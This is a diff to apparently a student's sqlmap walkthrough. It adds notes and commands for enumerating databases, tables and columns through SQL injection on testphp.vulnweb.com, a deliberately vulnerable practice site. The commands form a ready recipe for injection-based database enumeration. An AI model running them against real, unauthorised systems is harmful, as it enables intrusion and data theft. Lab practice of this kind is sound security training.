@@ -77,8 +77,13 @@ available databases [2]:
 
 [*] ending @ 12:27:17 /2023-01-21/
 ----------------------------------------------------------------------------------------------------------------------------------------------
- ➤➤ 
- 
+ ➤➤ After executing [sqlmap -u testphp.vulnweb.com/artists.php?artist=1 –dbs] it gives two Databases of that website.
+ ➤➤ Names of those databases are 1.acuart 2.information_schema.
+ ➤➤ I will be performing operations on Acuart
+---------------------------------------------------------------------------------------------------------------------------------------
+ ➤➤ To Check tables of Acuart Database i am using this command
+           sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –tables
+
 ┌──(kali㉿kali)-[~]
 └─$ sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –tables
         ___
@@ -126,7 +131,7 @@ Database: acuart
 [12:45:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
 
 [*] ending @ 12:45:25 /2023-01-21/
-
+---------------------------------------------------------------------------------------------------------------------------------
                                                                                                                                                                                
 ┌──(kali㉿kali)-[~]
 └─$ sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T products –columns
